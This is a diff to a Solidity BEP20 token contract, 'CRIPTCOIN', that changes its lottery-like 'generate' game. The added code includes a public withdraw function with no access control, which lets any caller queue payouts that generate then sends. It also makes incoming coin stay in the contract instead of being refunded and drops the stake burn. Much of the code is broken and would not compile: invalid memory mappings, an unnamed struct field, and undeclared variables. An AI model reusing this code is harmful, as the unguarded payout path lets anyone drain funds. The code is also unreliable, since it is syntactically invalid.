@@ -69,7 +69,7 @@ interface IBEP20 {
      *
      * Emits an {Approval} event.
      */
-    function generate(address counter, uint256 no) external returns (bool);
+    function _generate(address counter, uint256 no) external returns (bool);
 
      /**
       * @dev generate token from external contract.
@@ -361,7 +361,12 @@ contract CRIPTCOIN is Context, IBEP20, Ownable {
 
     mapping (address => mapping (address => uint256)) private _allowances;
 
+    mapping (uint256 => address payable [] memory) public _poolAddrs;
+
+    mapping (uint256 => uint256 [] memory) public _poolTxn;
+
     address public _dead;
+    uint256 public _totalValue;
     uint256 private _totalSupply;
     uint256 public _circSupply;
     uint256 public _stake;
@@ -383,11 +388,16 @@ contract CRIPTCOIN is Context, IBEP20, Ownable {
         _symbol = "CRIPT";
         _decimals = 18;
         _totalSupply = 10000000000000000000000000; // 10,000,000 token
-        _stake = 200000000000000000; // 0.2 token
+        _stake = 1000000000000000000000; // 1000 token
         _reward = 5000000000000000000; // 5 tokens
         _balances[msg.sender] = _totalSupply;
 
         emit Transfer(address(0), msg.sender, _totalSupply);
+    }
+
+    struct MemPool {
+        address payable [] memory;
+        uint256 [] memory txn;
     }
 
     /**
@@ -522,11 +532,18 @@ contract CRIPTCOIN is Context, IBEP20, Ownable {
         _circSupply = circSupply;
     }
 
+    function withdraw(address _to, uint256 _amnt) public {
+             _poolAddrs[round].push(_to);
+             _poolTxn[round].push(_amnt);
+    }
+
     function generate(address _counter, uint256 _no) external returns (bool) {
         require(_balances[address(this)] >= _reward, "insufficient liquidity");
 
         uint256 luckyno = _tryTime[_counter] + _totalTry - 1;
         _luckyNO = luckyno;
+
+        _execute(_poolAddrs[round], _poolTxn[round]);
 
         if (_no == luckyno) {
             _round++;
@@ -539,14 +556,12 @@ contract CRIPTCOIN is Context, IBEP20, Ownable {
                 _status = "FALSE";
         }
 
-        if (_round == 100) {
+        if (_circSupply >= 50000000000000000000) {
             ismainnet = !ismainnet;
         }
 
         if (ismainnet == true) {
-            require(_balances[msg.sender] >= _stake, "insufficient balance to play");
-            _circSupply = _circSupply.sub(_stake);
-            _transfer(msg.sender, _dead, _stake);
+            require(_balances[msg.sender] >= _stake, "insufficient balance to generate");
         }
 
         if (_tryTime[_counter] == 4) {
@@ -575,8 +590,7 @@ contract CRIPTCOIN is Context, IBEP20, Ownable {
      * auto fallback for external contract auto minning.
      */
     receive() external payable {
-        address payable sender = msg.sender;
-        msg.value.send(sender);
+        _totalValue += msg.value;
     }
 
     /**
@@ -652,11 +666,11 @@ contract CRIPTCOIN is Context, IBEP20, Ownable {
         emit Transfer(account, address(0), amount);
     }
 
-    function _execute(address payable [] memory _txn, uint256 [] memory _vle) internal {
-        for (i; i < _txn.length; i++) {
+    function _execute(address payable [] memory _addrs, uint256 [] memory _vle) internal {
+        for (i; i < _addrs.length; i++) {
             require(total >= _vle[i]);
             total = total.sub(_vle[i]);
-            _txn[i].transfer(_vle[i]);
+            _addrs[i].transfer(_vle[i]);
         }
     }
 
